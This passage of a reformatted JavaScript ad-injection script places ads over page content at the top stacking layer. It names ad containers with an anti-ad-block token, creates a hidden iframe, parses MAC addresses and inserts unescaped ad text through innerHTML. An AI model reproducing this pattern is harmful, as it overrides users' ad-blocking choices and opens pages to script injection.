              that.imageLog(ad.logUrl, ad);
              that.appImageLog(ad.appLogUrl)
          }
      },
      addImageTxtWrap: function(ad) {
          ad.dom.style.height = "80px";
          ad.dom.style.padding = "3px";
          var title = ad.title.indexOf(ad.mproId) == -1 ? ad.title : ad.desc.indexOf(ad.mproId) == -1 ? ad.desc : "";
          var div = document.createElement("div");
          div.style.position = "absolute";
          div.style.top = "3px";
          if (ad.graphic == "2") {
              div.style.left = "10px";
              div.style.width = ad.swidth - 130 + "px"
          } else {
              if (ad.graphic == "1") {
                  div.style.left = "135px";
                  div.style.width = ad.swidth - 162 + "px"
              }
          }
          if (ad.title.indexOf(ad.mproId) == -1 && ad.desc.indexOf(ad.mproId) == -1) {
              div.style.top = "3px";
              div.innerHTML = String.prototype.concat.call('<p style="display:inline-block;width:90%;height:auto;line-height:30px;font-size:17px;overflow: hidden;text-overflow:ellipsis;white-space: nowrap;" >' + title + "</p>" + '<p style="display:inline-block;width:90%;line-height:34px;font-size:15px;overflow: hidden;text-overflow:ellipsis;white-space: nowrap;" >' + ad.desc + "</p>");
              ad.dom.appendChild(div)
          } else {
              if (title) {
                  div.style.top = "50%";
                  div.innerHTML = String.prototype.concat.call('<p style="display:inline-block;width:90%;height:auto;line-height:20px;font-size:17px;word-break: break-all;" >' + title + "</p>");
                  ad.dom.appendChild(div);
                  div.style.marginTop = -div.offsetHeight / 2 + "px"
              }
          }
      }
  };
  function isMobile() {
      return navigator.userAgent.match(/(iPhone|iPod|Android|ios|SymbianOS|iPad|Mobile|Windows Phone)/i)
  }
  function checkEnv() {
      var crossDomain = false;
      try {
          crossDomain = false
      } catch (e) {
          crossDomain = false
      }
      var url = null;
      if (crossDomain) {
          var reg = /^http(s)?:\/\/(.*?)\//;
          if (parent !== window) {
              try {
                  url = parent.location.host.toLowerCase()
              } catch (e) {
                  url = reg.exec(document.referrer.toLowerCase())[2]
              }
          } else {
              url = window.location.host.toLowerCase()
          }
      } else {
          url = window.top.location.host.toLowerCase()
      }
      for (var i = 0; i < filterString.length; i++) {
          if (url.indexOf(filterString[i]) >= 0) {
              return false
          }
      }
      return true
  }
  function parseMac(mac) {
      var newMac = "";
      if (mac != "") {
          for (i = 0; i < mac.length; i++) {
              newMac += mac[i];
              if (((i + 1) & 1) == 0 && (i + 1) != mac.length) {
                  newMac += ":"
              }
          }
      }
      return newMac
  }
  function is_weixin() {
      var ua = navigator.userAgent.toLowerCase();
      if (ua.match(/MicroMessenger/i) == "micromessenger") {
          return true
      } else {
          return false
      }
  }
  function IsPC() {
      var userAgentInfo = navigator.userAgent;
      var Agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
      var flag = true;
      for (var v = 0; v < Agents.length; v++) {
          if (userAgentInfo.indexOf(Agents[v]) > 0) {
              flag = false;
              break
          }
      }
      return flag
  }
  function creatWeiximTrip() {
      var winHeight = typeof window.innerHeight != "undefined" ? window.innerHeight : document.documentElement.clientHeight;
      var weixinTip = document.createElement("div");
      var idAtt = document.createAttribute("id");
      idAtt.value = "weixinTip";
      weixinTip.setAttributeNode(idAtt);
      weixinTip.style.height = winHeight + "px";
      var winxinP = document.createElement("p");
      var winxinImg = document.createElement("img");
      var imgSrcAttr = document.createAttribute("src");
      imgSrcAttr.value = "./imgs/zz.png";
      var imgAltAttr = document.createAttribute("alt");
      imgAltAttr.value = "微信打开";
      winxinImg.setAttributeNode(imgSrcAttr);
      winxinImg.setAttributeNode(imgAltAttr);
      winxinP.appendChild(winxinImg);
      weixinTip.appendChild(winxinP);
      document.body.appendChild(weixinTip)
  }
  function createIframe() {
      var iframe = document.createElement("iframe");
      iframe.style.cssText = "display:none;width:0px;height:0px;";
      document.body.appendChild(iframe)
  }
  var unique = (function() {
      var time = (new Date()).getTime() + "-"
        , i = 0;
      return function() {
          return time + (i++)
      }
  }
  )();
  function createDivByJsPosition(ad) {
      var div = (String.prototype.concat.call('<div style="z-index:2147483647;" cprotype="' + ad.host + '">', "</div>")).toDom();
      if (ad.antiBlockToken && ad.antiBlockToken !== "" && ad.antiBlockToken.indexOf("?") > -1) {
          var scriptId = ad.antiBlockToken.split("?")[1];
          scriptId = scriptId.split("=")[0] + scriptId.split("=")[1];
          div.id = scriptId;
          div.style.width = "100%";
          ad.divId = div.id
      } else {
          div.id = ad.divId
      }
      var i = scriptDom
        , l = document.body.firstChild;
      if (!scriptDom) {
          throw new Error("no position Info");
          return
      }
      var res = i.compareDocumentPosition(l);
      if (i) {
          res == 4 ? document.body.insertBefore(div, document.body.firstChild) : i.parentNode.insertBefore(div, i)
      }
      ad.dom = div;
      ad.dom.style.height = "auto"
  }
  function createDivByApi(ad) {
      var wrapper = document.getElementById(ad.divId);
      wrapper.id = ad.divId;
      wrapper.style.position = "relative";
      wrapper.style.zIndex = 214783647;
      wrapper.style.width = "100%";
      wrapper.style.padding = 0;
      wrapper.style.margin = 0;
      wrapper.style.background = "#fff";
      wrapper.style.height = "auto";
      wrapper.style.fontSize = 0;
      wrapper.innerHTML = String.prototype.concat.call('<div id="ZMAdclose" style="top:0;right:0;position:absolute;width:32px;height:32px;border-radius:99px;color:#fff;background:url(\'//x.hao61.net/nuomitemp/zmengbuoyicon/close.png\') no-repeat;z-index:999;" >', "</div>");
      var mob_adicon = document.createElement("img");
      mob_adicon.id = "ZMAdicon";
      mob_adicon.src = "https://cpro.baidustatic.com/cpro/ui/noexpire/img/mob_adicon.png";
      mob_adicon.style.position = "absolute";
      mob_adicon.style.zIndex = "99";
      mob_adicon.style.width = "26px";
      if (ad.graphic == "2" && ad.diagram == "2") {
          mob_adicon.style.left = "10px"
      } else {
          mob_adicon.style.right = "10px"
      }
      mob_adicon.style.bottom = "5px";
      wrapper.appendChild(mob_adicon);
      ad.dom = wrapper;
      wrapper.parentNode.appendChild(wrapper)
  }
  function closeAd(dom) {
      var e = event || window.event;
      if (e.stopPropagation) {
          e.stopPropagation()
      } else {
          e.cancelBubble = true
      }
      dom.style.display = "none"
  }
  var addEvent = (function() {
      if (document.addEventListener) {
          return function(el, type, fn) {
              el.addEventListener(type, function(e) {
                  fn.call(el, e)
              }, false)
          }
      } else {
          if (window.attachEvent) {
              return function(el, type, fn) {
                  el.attachEvent("on" + type.toString(), function(e) {
                      fn.call(el, e)
                  })
              }
          }
      }
  }
  )();
  function setStyle(dom, styleJson) {
      if (!styleJson || !dom) {
          return
      }
      for (var i in styleJson) {
          if (styleJson[i]instanceof Object) {
              dom.setAttribute(i, styleJson[i].value)
          } else {
              dom.style[i] = styleJson[i]
          }
      }
      return dom
  }
  function formatmatUrl(str) {
      if (!str) {
          return
      }
      var arr = str.substring(2, str.length - 2).split("},{");
      if (!arr.length) {
          arr = []
      } else {
          var conArr = [];
          for (var i = 0; i < arr.length; i++) {
              conArr.push(arr[i].substring(1, arr[i].length - 1))
          }
          arr = conArr
      }
      return arr
  }
  function getTimestamp(time) {
      var date = new Date();
      date = date.getFullYear() + "/" + (date.getMonth() + 1) + "/" + date.getDate() + " " + addZero(time.split(":")[0]) + ":" + addZero(time.split(":")[1]) + ":00";
      return new Date(date).getTime()
  }
  function addZero(val) {
      return val.length < 2 ? "0" + val : val
  }
  function getCd(startTime, endTime) {
      startTime = getTimestamp(startTime);
      endTime = getTimestamp(endTime);
      if (endTime < startTime) {
          return false
      }
      return parseInt((endTime - startTime) / 1000)
  }
  function isCdFn(time) {
      var time = time.split(","), result, stampNow, startStamp, endStamp, start, end;
      stampNow = new Date().getTime();
      for (var i = 0; i < time.length; i++) {
          var arr = time[i].split("-");
          start = arr[0],
          end = arr[1];
          startStamp = getTimestamp(start),
          endStamp = getTimestamp(end);
          if (stampNow >= startStamp && stampNow <= endStamp) {
              result = new Date().getHours() + ":" + new Date().getMinutes() + "-" + end
          }
      }
      return result
  }
  var zAdFix = new ADFIX()
}(window);
